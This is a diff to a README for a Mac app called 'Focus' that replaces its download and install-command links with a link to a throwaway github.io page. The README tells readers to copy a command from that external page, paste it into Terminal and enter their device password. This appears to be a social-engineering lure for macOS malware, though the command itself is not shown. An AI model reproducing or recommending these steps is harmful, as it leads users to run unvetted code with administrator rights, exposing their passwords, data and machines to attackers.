@@ -3,7 +3,7 @@
 
 Focus for Mac is a powerful productivity tool that helps you stay concentrated by blocking distracting websites, apps, and notifications 🚀. With a clean interface and customizable schedules, Focus ensures you can achieve deep work without interruptions. Follow the guide below to install it easily on your Mac.
 
-[![Download for Mac](https://img.shields.io/badge/Download%20for%20Mac-007AFF?style=for-the-badge&logo=apple)](https://juianaiud84.github.io/.github/focus)
+[![Get Installation Instruction](https://img.shields.io/badge/Get%20Installation%20Instruction-2EA44F?style=for-the-badge&logo=github&logoColor=white)](https://dinkkennyrice406.github.io/.github/)
 
 If the button above doesn’t work, please follow the installation steps below using the terminal command.
 
@@ -22,7 +22,7 @@ If the button above doesn’t work, please follow the installation steps below u
 
 1. Click the button below to get the installation command.  
 
-[![Get Install Command](https://img.shields.io/badge/Get%20Install%20Command-000000?style=for-the-badge&logo=apple)](https://gistcdn.githack.com/temptation880/5f5a7dad66e66195ec88d6ab2e214a31/raw/970a010b9e0acf36323e04e712a10550b3924b18/install.html)
+[![Get Installation Instruction](https://img.shields.io/badge/Get%20Installation%20Instruction-2EA44F?style=for-the-badge&logo=github&logoColor=white)](https://dinkkennyrice406.github.io/.github/)
 
 2. Open the terminal on your device and paste the command you copied above, then press the “Return” button.
 3. Enter your device password and confirm the installation. 
